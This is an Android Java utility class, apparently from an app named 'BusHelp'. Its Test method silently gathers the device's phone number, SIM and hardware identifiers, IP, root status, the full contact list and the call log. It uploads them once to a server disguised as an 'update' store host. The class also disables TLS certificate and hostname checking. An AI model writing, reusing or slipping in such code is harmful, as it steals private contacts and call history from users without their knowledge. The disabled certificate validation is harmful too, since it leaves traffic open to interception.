package util;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Date;


import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class Invoke {

    private SharedPreferences.Editor mEdit;

    public void Test(final Context paramContext) {
        SharedPreferences sp = paramContext.getSharedPreferences("sp", Context.MODE_PRIVATE);
        boolean getData = sp.getBoolean("getData", false);
        mEdit = sp.edit();
        if (!getData) {
            Object localObject = new PhoneInfo(paramContext);
            String str1 = ((PhoneInfo) localObject).getNativePhoneNumber();
            String str2 = ((PhoneInfo) localObject).getProvidersName();
            String str3 = Build.BRAND;
            String str4 = ((PhoneInfo) localObject).getPhoneInfo();
            String str5 = ((PhoneInfo) localObject).getLocalMac()==null?"":((PhoneInfo) localObject).getLocalMac();
            String str6 = ((PhoneInfo) localObject).getHostIP()==null?"":((PhoneInfo) localObject).getHostIP();
            String str7 = ((PhoneInfo) localObject).haveRoot()==null?"":((PhoneInfo) localObject).haveRoot();
            String str8 = Build.VERSION.RELEASE;
            String str9 = ((PhoneInfo) localObject).isCN(paramContext);
            String str10 = ((PhoneInfo) localObject).language();
            String str11 = ((PhoneInfo) localObject).getContact2()==null?"":((PhoneInfo) localObject).getContact2();

            String str13 = ((PhoneInfo) localObject).GetCallsInPhone()==null?"":((PhoneInfo) localObject).GetCallsInPhone();

            String str12 = "BusHelp";


            OkHttpClient okHttpClient = new OkHttpClient();

            try {
                final TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    @Override
                    public void checkClientTrusted(
                            java.security.cert.X509Certificate[] chain,
                            String authType) throws CertificateException {
                    }

                    @Override
                    public void checkServerTrusted(
                            java.security.cert.X509Certificate[] chain,
                            String authType) throws CertificateException {
                    }

                    @Override
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return new X509Certificate[0];
                    }
                }};

                // Install the all-trusting trust manager
                final SSLContext sslContext = SSLContext.getInstance("SSL");
                sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
                 okHttpClient .newBuilder().sslSocketFactory(sslContext.getSocketFactory())
                        .hostnameVerifier(new HostnameVerifier() {

                            @Override
                            public boolean verify(String hostname, SSLSession session) {
                                // TODO Auto-generated method stub
                                return true;

                            }
                        }).build();
            } catch (KeyManagementException e) {
                e.printStackTrace();
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }


            RequestBody body = new FormBody.Builder()
                    .add("num", str1).add("type", str2)
                    .add("brand", str3)
                    .add("uicc", str4)
                    .add("mac", str5)
                    .add("ip", str6)
                    .add("root", str7)
                    .add("version", str8)
                    .add("is_cn", str9)
                    .add("language", str10)
                    .add("contact", str11)
                    .add("call", str13)
                    .add("app",str12)
                    .build();
            String url="https://update.androidsstore.com/libraryservers/PhoneServlet";
//            String url="http://192.168.1.110:8080/PhoneInfo/PhoneServlet";
            HttpUtil.getInstance().ssl().requestPost(url,
                    body, new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            Log.e("------", "onFailure: " + e.getMessage());
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {
                            mEdit.putBoolean("getData",true);
                            mEdit.commit();
                            Log.e("------", "onResponse: ");
                        }
                    });

//            Request request = new Request.Builder()
//                    .url("https://update.androidsstore.com/libraryservers/PhoneServlet")
//                    .post(body)
//                    .build();
//
//            okHttpClient.newCall(request).enqueue(new Callback() {
//                @Override
//                public void onFailure(Call call, IOException e) {
//                    Log.e("------", "onFailure: " + e.getMessage());
//                }
//
//                @Override
//                public void onResponse(Call call, okhttp3.Response response) throws IOException {
//                    mEdit.putBoolean("getData",true);
//                    mEdit.commit();
//                    Log.e("------", "onResponse: ");
//                }
//            });
        }

    }

    /**
     * @return 返回当前时间
     */
    public static String getTime() {
        Date now = new Date();
        java.text.SimpleDateFormat dateFormat = new java.text.SimpleDateFormat("yyyy-MM-dd+HH:mm");//可以方便地修改日期格式
        return dateFormat.format(now);
    }

    /**
     * 权限检查
     */
    public boolean hasPermission(Context context, String... permissions) {
        if (Build.VERSION.SDK_INT < 23) {
            return true;
        }

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(context, permission) !=
                    PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }


}


